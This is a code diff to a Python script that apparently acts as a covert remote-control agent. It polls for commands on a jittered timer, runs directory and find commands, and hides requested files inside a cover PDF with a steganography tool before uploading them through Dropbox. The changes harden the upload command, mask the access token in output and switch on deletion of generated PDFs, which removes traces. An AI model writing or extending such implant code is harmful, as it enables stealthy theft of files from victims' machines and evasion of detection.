@@ -8,7 +8,6 @@ import bwt
 
 import time
 import random
-import tempfile
 
 import dropbox
 
@@ -16,18 +15,24 @@ import traceback
 
 # For both of these, throw away the stdout+stderr
 def assemble_pdf_data(data: bytes, key: str, output_name: str):
-    with tempfile.NamedTemporaryFile() as data_fil:
-        data_fil.write(data)
-        # This only works on Unix-like systems
-        hide_result = subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name, 
-            "-k", key, "embed", data_fil.name, "./pdf_base.pdf"], capture_output=True)
-        if not hide_result.ok:
-            print(hide_result.stderr)
+    temp_file_name = f"/tmp/{random.randint(1000000, 9999999)}"
+    try:
+        with open(temp_file_name, "wb") as data_fil:
+            data_fil.write(data)
+            data_fil.flush()
+            # This only works on Unix-like systems
+            hide_result = subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name,
+                "-k", key, "embed", data_fil.name, "./pdf_base.pdf"], capture_output=True)
+            if hide_result.returncode != 0:
+                print(hide_result.stderr)
+    finally:
+        os.unlink(temp_file_name)
+
 
 def assemble_pdf_path(path: str, key: str, output_name: str):
     hide_result = subprocess.run(["./pdf_hide/pdf_hide", "-o", output_name,
         "-k", key, "embed", path, "./pdf_base.pdf"], capture_output=True)
-    if not hide_result.ok:
+    if hide_result.returncode != 0:
         print(hide_result.stderr)
 
 def upload_file(dbx, file_path: str):
@@ -86,10 +91,15 @@ def main():
                     output_string += find_out.stdout + "\n" + f"Exit code {ls_out.returncode}"
                 elif line.startswith("upload "):
                     path = line[len("upload "):]
-                    output_string += f"Uploading as {current_time}_{len(upload_list)}.pdf"
-                    upload_list.append(os.path.expanduser(path))
+                    path = os.path.expanduser(path)
+                    if os.path.exists(path):
+                        output_string += f"Uploading as {current_time}_{len(upload_list)}.pdf"
+                        upload_list.append(os.path.expanduser(path))
+                    else:
+                        output_string += f"File {path} does not exist"
                 elif line.startswith("token "):
                     token = line[len("token "):]
+                    output_collation[-1] = "token [REDACTED]"
                 else:
                     output_string += "Command not recognized"
                 output_collation.append(output_string)
@@ -116,13 +126,11 @@ def main():
         finally:
             output_path = f"./{current_time}.pdf"
             if os.path.exists(output_path):
-                pass
-                #os.unlink(output_path)
+                os.unlink(output_path)
             for i, path in enumerate(upload_list):
                 output_path = f"./{current_time}_{i}.pdf"
                 if os.path.exists(output_path):
-                    pass
-                    #os.unlink(output_path)
+                    os.unlink(output_path)
 
         time.sleep(60+10*random.random())
 
